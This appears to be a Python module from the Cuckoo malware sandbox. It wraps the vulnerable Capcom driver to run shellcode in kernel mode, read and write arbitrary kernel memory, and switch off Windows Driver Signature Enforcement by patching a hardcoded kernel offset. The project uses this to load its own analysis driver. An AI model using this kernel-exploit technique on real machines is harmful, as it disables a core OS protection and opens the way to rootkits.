# Copyright (C) 2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import ctypes
import logging
import struct

from lib.common.defines import (
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, KERNEL32, PSAPI
)
from lib.common.rand import random_string
from lib.core.driver import Driver
from lib.core.ioctl import Ioctl

log = logging.getLogger(__name__)

class Capcom(Driver):
    ntoskrnl = {
        0x4ce7951a: 0x226eb8,
    }

    class x86:
        pass

    class x64:
        def get_MmGetSystemRoutineAddress(self):
            # mov qword [rel 0], rcx ; retn
            return "\x48\x89\x0d\xf1\xff\xff\xff\xc3"

        def read32(self, addr):
            # mov rax, addr ; mov rax, qword [rax]
            # mov qword [rel 0], rax ; retn
            return (
                "\x48\xb8" + struct.pack("Q", addr) +
                "\x48\x8b\x00\x48\x89\x05\xe4\xff\xff\xff\xc3"
            )

        def write32(self, addr, value):
            # mov rax, addr ; mov dword [rax], value ; retn
            return (
                "\x48\xb8" + struct.pack("Q", addr) +
                "\xc7\x00" + struct.pack("I", value) + "\xc3"
            )

    def __init__(self):
        Driver.__init__(self, "capcom", random_string(16))

        if self.is_64bit:
            self.arch = self.x64()
        else:
            self.arch = self.x86()

        self.mem = self.allocrwx()

    def allocrwx(self):
        return KERNEL32.VirtualAlloc(
            None, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )

    def run_bytes(self, buf):
        ioctl = Ioctl("\\\\.\\Htsysm72FB")
        ctypes.memmove(self.mem + 8, buf, len(buf))
        ctypes.memmove(self.mem, struct.pack("Q", self.mem + 8), 8)
        ioctl.invoke(0xaa013044, struct.pack("Q", self.mem + 8), 4)
        value = ctypes.create_string_buffer(8)
        ctypes.memmove(value, self.mem, 8)
        return struct.unpack("Q", value.raw)[0]

    def get_MmGetSystemRoutineAddress(self):
        return self.run_bytes(self.arch.get_MmGetSystemRoutineAddress())

    def read32(self, addr):
        return self.run_bytes(self.arch.read32(addr)) % 2**32

    def write32(self, addr, value):
        self.run_bytes(self.arch.write32(addr, value))

    def dse(self, enabled):
        """Disables or enables Driver Signature Enforcement."""
        ntoskrnl = self.get_MmGetSystemRoutineAddress() & ~0xfff

        addr, cnt = ctypes.c_void_p(), ctypes.c_uint()
        PSAPI.EnumDeviceDrivers(
            ctypes.byref(addr), ctypes.sizeof(addr), ctypes.byref(cnt)
        )
        if not cnt.value:
            log.warning("ntoskrnl.exe base address not found")
            return False

        # On 32-bit Python with 64-bit kernel, we'll only get the lower
        # 32-bits of the address, so we assemble the rest here.
        ntoskrnl = (ntoskrnl & 0xffffffff00000000) | (addr.value & 0xffffffff)

        e_lfanew = self.read32(ntoskrnl + 0x3c)
        timestamp = self.read32(ntoskrnl + e_lfanew + 8)

        if timestamp not in self.ntoskrnl:
            log.warning(
                "Unknown ntoskrnl.exe version, timestamp: 0x%08x", timestamp
            )
            return False

        if enabled:
            self.write32(ntoskrnl + self.ntoskrnl[timestamp], 1)
        else:
            self.write32(ntoskrnl + self.ntoskrnl[timestamp], 0)
